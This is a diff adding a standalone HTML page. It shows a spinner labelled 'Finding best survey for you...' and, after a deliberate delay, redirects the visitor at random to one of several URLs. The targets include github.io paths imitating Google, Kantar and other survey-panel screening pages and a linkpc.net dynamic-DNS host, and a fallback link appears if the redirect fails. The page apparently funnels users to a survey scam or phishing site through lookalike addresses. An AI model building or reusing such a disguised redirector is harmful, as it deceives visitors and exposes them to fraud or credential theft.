@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="UTF-8">
+<title></title>
+
+<style>
+body {
+  margin:0;
+  font-family: Arial;
+  background: linear-gradient(135deg,#667eea,#764ba2);
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  color:white;
+  text-align:center;
+}
+
+.box {
+  background: rgba(255,255,255,0.1);
+  padding:40px;
+  border-radius:15px;
+  backdrop-filter: blur(10px);
+}
+
+.loader {
+  margin-top:20px;
+  border:5px solid rgba(255,255,255,0.3);
+  border-top:5px solid white;
+  border-radius:50%;
+  width:40px;
+  height:40px;
+  animation: spin 1s linear infinite;
+  margin-left:auto;
+  margin-right:auto;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="box">
+  <h2>Finding best survey for you...</h2>
+  <p>Please wait while we connect you.</p>
+  <div class="loader"></div>
+</div>
+
+<script>
+
+// 🎯 SURVEY LINKS
+const surveys = [
+  "https://api-openionbd.github.io/surveys/router/247626.html",
+  "https://screeningopenionbd.github.io/Screening.aspx.id-allcounted.com/",
+  "https://screeningopenionbd.github.io/Screening.aspx.id-Google.com",
+  "https://screeningopenionbd.github.io/Screening.aspx.id-Kantar.com/",
+  "https://screeningopenionbd.github.io/Screening.aspx.id-SampleSurveys/",
+  "https://samplecube.linkpc.net/session/125",
+  "https://samplecube.linkpc.net/session/eror"
+];
+
+// 🎲 RANDOM PICK
+function getRandomSurvey() {
+  return surveys[Math.floor(Math.random() * surveys.length)];
+}
+
+// 🚀 REDIRECT
+function go() {
+  const selected = getRandomSurvey();
+
+  // optional: log
+  console.log("Redirecting to:", selected);
+
+  window.location.href = selected;
+}
+
+// ⏳ DELAY (more natural)
+setTimeout(go, 2000);
+
+// 🛑 FAILSAFE (if blocked)
+setTimeout(() => {
+  document.body.innerHTML += "<p>If not redirected, <a href='"+getRandomSurvey()+"' style='color:white;'>click here</a></p>";
+}, 4000);
+
+</script>
+
+</body>
+</html>
